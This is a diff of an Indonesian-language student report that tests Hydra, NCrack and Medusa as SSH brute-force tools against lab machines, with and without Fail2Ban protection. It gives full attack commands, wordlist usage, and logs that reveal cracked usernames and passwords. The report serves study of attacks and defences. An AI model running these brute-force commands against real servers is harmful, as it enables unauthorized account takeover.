@@ -152,16 +152,9 @@ Uji penetrasi 1 ini akan dilakukan dengan 3 aplikasi brute force attack yaitu Hy
 
 Dalam melakukan penetration test ini, kita bisa menggunakan sebuah password yang ingin ditebak, sebuah dictionary password, ataupun men-generate semua kemungkinan password yang bisa digunakan. Namun jika melakukan generate semua kemungkinan password, akan sangat banyak sekali percobaan yang akan dilakukan serta akan menghabiskan waktu yang sangat lama. Oleh karena itu, kami menggunakan dictionary password yang telah kami buat sebelumnya dengan menggunakan Crunch ditambah sebuah password yang benar didalamnya.
 
-//File yang kami gunakan ada 2:
-
-//* File yang berisi 10 baris ditambah dengan password asli. Bisa dilihat [disini](https://github.com/rafiarr/PKSJ-Tugas-1/blob/master/wordlist10.txt).
-//* File yang berisi 1000 baris ditambah dengan password asli. Bisa dilihat [disini](https://github.com/rafiarr/PKSJ-Tugas-1/blob/master/wordlist.txt).
-
-//Selain itu, uji penetrasi digunakan pada sistem yang tidak terproteksi untuk automated tools dan sistem yang terproteksi menggunakan [Fail2Ban](https://www.fail2ban.org/wiki/index.php/Main_Page).
-
 ##### Uji Penetrasi Menggunkan Hydra
 
-Hydra memungkinkan kita untuk mengatur jumlah task yang akan digunakan ketika melakukan brute force. Semakin banyak task akan semakin cepat, namun jumlah task yang bisa dijalankan sangat tergantung pada kecepatan internet dan setting SSH yang digunakan. Kami mencoba untuk melakukan beberapa test dengan jumlah dictionary yang berbeda-beda. Pertama, kami akan mencoba menebak dengan hanya 5 daftar kata di dictionary. Buka terminal kemudian jalankan command berikut ini.
+Hydra memungkinkan kita untuk mengatur jumlah task yang akan digunakan ketika melakukan brute force. Semakin banyak task akan semakin cepat, namun jumlah task yang bisa dijalankan sangat tergantung pada kecepatan internet dan setting SSH yang digunakan. Dengan asumsi kami sudah mengetahui user yang akan diserang dari sebuah komputer, kami mencoba untuk melakukan beberapa test dengan jumlah dictionary yang berbeda-beda. Pertama, kami akan mencoba menebak dengan hanya 5 daftar kata di dictionary. Buka terminal kemudian jalankan command berikut ini.
 
 ```bash
 hydra -l rafiar -P /root/wordlist.txt -t 5 10.151.32.131 ssh
@@ -242,7 +235,7 @@ Lama eksekusi hingga menemukan password: 129 detik.
 
 ##### Uji Penetrasi Menggunkan NCrack
 
-Untuk menjalankan eksekusi pada NCrack, cukup jalankan command di bawah ini:
+Dalam percobaan pertama kami menggunakan sebuah dictionary dengan beberapa baris kemungkinan password. Untuk menjalankan eksekusi pada NCrack, cukup jalankan command di bawah ini:
 
 ```bash
 ncrack -v --user nafiar -P wordlist.txt ssh://10.151.34.43
@@ -256,9 +249,7 @@ Starting Ncrack 0.5 ( http://ncrack.org ) at 2017-10-21 04:13 UTC
 Discovered credentials on ssh://10.151.34.43:22 'nafiar' 'guenafiar'
 ```
 
-Password berhasil ditemukan.
-
-Log hasil eksekusi dari command tersebut pada file berisi 5 baris ditambah password asli:
+Password berhasil ditemukan. Kemudian kami mengulangi kembali percobaan tersebut dengan sebuah dictionary berisi 2000 baris kemungkinan password. Log hasil eksekusi dari command tersebut pada file berisi 2000 baris ditambah password asli seperti berikut:
 
 ```bash
 # Ncrack 0.5 scan initiated Sat Oct 21 04:16:34 2017 as: ncrack -v --user nafiar -P wordlist.txt -oN hasilNcrack2000line.txt ssh://10.151.34.43 
@@ -272,9 +263,9 @@ Probes sent: 531 | timed-out: 0 | prematurely-closed: 194
 
 Password berhasil ditemukan dalam 288 detik.
 
-#### Uji Penetrasi Menggunkan Medusa
+##### Uji Penetrasi Menggunkan Medusa
 
-Untuk menjalankan eksekusi pada Medusa, cukup jalankan command di bawah ini:
+Medusa akan melakukan brute force sambil menampilkan semua proses percobaan yang dilakukan untuk setiap kemungkinan password. Kami menguji Medusa dengan menggunakan dictionary berisi 100 kemungkinan password. Untuk menjalankan eksekusi pada Medusa, cukup jalankan command di bawah ini:
 
 ```bash
 medusa -u rafiar -P wordlist.txt -h 10.151.32.131 -M ssh
@@ -299,4 +290,94 @@ ACCOUNT FOUND: [ssh] Host: 10.151.32.131 User: rafiar Password: 19102017 [SUCCES
 
 Password berhasil ditemukan.
 
+#### Uji Penetrasi 2
+
+Uji Penetrasi 2 dilakukan dengan menggunakan ssh yang telah konfigurasi ulang dan menggunakan aplisi counter measure bernama Fail2Ban. Aplikasi ini akan memblokir untuk sementara komputer-komputer yang gagal mencoba untuk login beberapa kali selama waktu tertentu.
+
+##### Uji Penetrasi Menggunakan Hydra
+
+Karena Fail2Ban akan memblokir komputer penyerang selama beberapa menit, maka kami menggunakan sebuah dictionary yang hanya berisi 10 baris kata dan ditambah 1 password asli agar tidak terlalu memakan waktu lama. Percobaan ini kami lakukan beberapa kali dengan konfigurasi yang sama persis. Log hasil eksekusi setelah dilindungi dengan Fail2Ban:
+
+```bash
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-10-23 04:23:37
+[DATA] max 1 task per 1 server, overall 1 task, 11 login tries (l:1/p:11), ~11 tries per task
+[DATA] attacking ssh://10.151.34.43:22/
+[STATUS] 8.00 tries/min, 8 tries in 00:01h, 3 to do in 00:01h, 1 active
+[22][ssh] host: 10.151.34.43   login: nafiar   password: guenafiar
+<finished>
+```
+```bash
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-10-23 04:26:17
+[DATA] max 1 task per 1 server, overall 1 task, 11 login tries (l:1/p:11), ~11 tries per task
+[DATA] attacking ssh://10.151.34.43:22/
+[STATUS] 8.00 tries/min, 8 tries in 00:01h, 3 to do in 00:01h, 1 active
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-10-23 04:27:43
+<finished>
+```
+```bash
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-10-23 04:28:47
+[DATA] max 1 task per 1 server, overall 1 task, 11 login tries (l:1/p:11), ~11 tries per task
+[DATA] attacking ssh://10.151.34.43:22/
+[STATUS] 8.00 tries/min, 8 tries in 00:01h, 3 to do in 00:01h, 1 active
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-10-23 04:30:21
+<finished>
+```
+
+Percobaan berkali-kali dengan menggunakan Hydra tidak selalu memberikan hasil yang baik. Dari tiga kali percobaan tersebut kami hanya berhasil mendapatkan satu hasil yang benar meskipun tidak ada perubahan yang kami lakukan pada konfigurasi SSH ataupun Hydra diantara ketiga percobaan tersebut.
+
+##### Uji Penetrasi Menggunakan NCrack
+
+Kami menggunakan sebuah dictionary yang berisi 30 baris kata dengan sebuah password asli didalamnya. Log hasil eksekusi setelah dilindungi dengan Fail2Ban:
+
+```bash
+Starting Ncrack 0.5 ( http://ncrack.org ) at 2017-10-21 05:21 UTC
+
+Discovered credentials on ssh://10.151.34.43:22 'nafiar' 'guenafiar'
+ssh://10.151.34.43:22 finished.
+
+Discovered credentials for ssh on 10.151.34.43 22/tcp:
+10.151.34.43 22/tcp ssh: 'nafiar' 'guenafiar'
+
+Ncrack done: 1 service scanned in 938.97 seconds.
+Probes sent: 1382 | timed-out: 1290 | prematurely-closed: 5
+
+Ncrack finished.
+```
+
+Proses percobaan tersebut berlangsung dengan lancar meskipun memakan waktu selama 16 menit.
+
+
+
+##### Uji Penetrasi Menggunakan Medusa
+
+Pengujian ini dilakukan dengan menggunakan dictionary berisi 10 baris kata. Semua hasil percobaan password akan ditampilkan dalam log. Log hasil eksekusi setelah dilindungi dengan Fail2Ban:
+
+```bash
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111111 (1 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111119 (2 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111110 (3 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111112 (4 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111117 (5 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111191 (6 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111199 (7 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111190 (8 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111192 (9 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111197 (10 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: guenafiar (11 of 11 complete)
+ACCOUNT FOUND: [ssh] Host: 10.151.34.43 User: nafiar Password: guenafiar [SUCCESS]
+```
+
 ## Kesimpulan
+
+Apliasi Hydra bisa melakukan tugas dengan lebih cepat karena bisa memanfaatkan banyak task dalam proses brute force. Namun penggunaan Hydra akan lebih tidak stabil dibanding dengan aplikasi brute force lainnya. NCrack dan Medusa bisa menjalankan brute force dengan sangat baik tanpa mengalami kegagalan. Namun Medusa akan sedikit lebih lambat dari kedua aplikasi lainnya. 
+
